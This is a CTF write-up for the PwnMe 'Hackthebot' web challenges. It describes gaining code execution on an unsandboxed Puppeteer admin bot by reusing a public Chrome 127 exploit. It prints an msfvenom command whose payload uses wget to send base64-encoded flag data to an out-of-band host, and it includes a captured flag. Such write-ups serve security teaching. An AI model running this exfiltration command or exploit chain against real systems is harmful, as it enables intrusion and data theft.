---
title: Too Lazy to get XSS? Then use n-days to get RCE in the Admin bot
date: 2025-03-02 11:20:05 +0530
categories: [pwnmectf,pwnme,web,ndays]
tags: [CTFTIME WRITEUP]
excerpt: Hackthebot 1 & 2 are web challenges from pwnme CTF
---

![image](https://github.com/user-attachments/assets/d04d656c-d2ed-4520-a134-b91b3b2318cd)

<br><br>

- Hackthebot 1 & 2 are web challenges from [PWNME](https://pwnme.phreaks.fr/challenges) CTF
- Both challenges shared the same instance: the first flag was stored in a cookie, while the second was located at `/root/flag2.txt`
- The intended approach was to exploit XSS to leak the cookie, while the second challenge involved using DevTools in some way
- But I really surprised with their configurations

```js
const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });
```

<br><br>

- The above code is from `source/app.js` and gets executed when the admin bot opens the link we provide
-  `--no-sandbox` flag was enabled, meaning that if I could compromise the renderer, gaining RCE would be ezPZ 😛
- I quickly checked the browser version 🧐


```css
root@e23711a7c095:~/.cache# ls -la ~/.cache/puppeteer/chrome/
total 12
drwxr-xr-x 3 root root 4096 Mar  1 13:40 .
drwxr-xr-x 4 root root 4096 Mar  1 13:39 ..
drwxr-xr-x 3 root root 4096 Mar  1 13:40 linux-127.0.6533.88
```

<br><br>

- They're running Chrome 127 🤔
- This version is vulnerable to multiple CVEs.

![image](https://github.com/user-attachments/assets/6ac08ac9-acde-4450-aced-3402bf172547)

<br><br>

- I recently came across this exploit last week: [https://issues.chromium.org/issues/365802567 ](https://issues.chromium.org/issues/365802567)
- Exploit POC: [https://issues.chromium.org/action/issues/365802567/attachments/59303131?download=false](https://issues.chromium.org/action/issues/365802567/attachments/59303131?download=false)
- The exploit is straightforward to test, requiring no modifications like offset adjustments for this specific Chrome version
- We just need to remove some windows specific cmd `calc` and replace shellcode

![image](https://github.com/user-attachments/assets/ff1f594b-ba68-4f56-846a-922e5e88f843)

<br><br>

- So I replaced the shellcode in the exploit and sent the link to ADMIN bot

![image](https://github.com/user-attachments/assets/423ecd8e-c4c3-42bf-8924-dd016f6da3e9)

<br><br>

- And got the second flag `PWNME{Th3re_ls_Mu1T1pL3_US4g3_Of_C4CH3:333}` 😝
- For the first flag

```bash
msfvenom -p linux/x64/exec CMD='wget https://uglxpmedoaubicfpwdzk5zdyse62qt1id.oast.fun/flag1=$(cat</app/app.js|grep${IFS}PWNME{|base64)' -f py
```

![image](https://github.com/user-attachments/assets/efadbce2-a702-4247-99ef-72698d9b3c2f)

<br><br>

- This scenario underscored the importance of examining configurations closely, as they can sometimes lead to unintended paths.
- I appreciate you taking the time to read this write-up :) hope you found it interesting! Thanks for reading! 😊

![](https://raw.githubusercontent.com/jopraveen/jopraveen/main/some-gifs/cat-cute.gif)
